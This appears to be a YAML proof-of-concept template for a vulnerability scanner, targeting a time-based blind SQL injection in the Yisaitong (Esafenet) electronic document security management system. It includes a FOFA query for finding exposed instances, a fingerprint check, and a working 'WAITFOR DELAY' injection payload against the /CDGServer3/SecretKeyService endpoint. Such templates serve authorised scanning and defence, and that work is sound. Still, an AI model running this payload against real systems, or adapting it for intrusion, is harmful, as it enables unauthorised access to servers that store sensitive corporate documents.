id: poc-yaml-yisaitong-esafenet-secretkeyservice-sqli
info:
  name: 亿赛通电子文档安全管理系统 SecretKeyService SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 亿赛通电子文档安全管理系统
  fofa: app="亿赛通-电子文档安全管理系统"
variables:
  t1: random_int(5,10)
  t2: t1 + 2
  t3: gbk_encode("电子文档安全管理系统")
requests:
- method: GET
  path: /
  expression: status_code == 200 && contains(body,t3)
- method: GET
  path: /CDGServer3/SecretKeyService?command=sameKeyName&keyName=1'+WAITFOR+DELAY+'0:0:{{.t1}}'--+
  expression: status_code == 200 && body == "0" && duration > t1 && duration < t2
transport: http
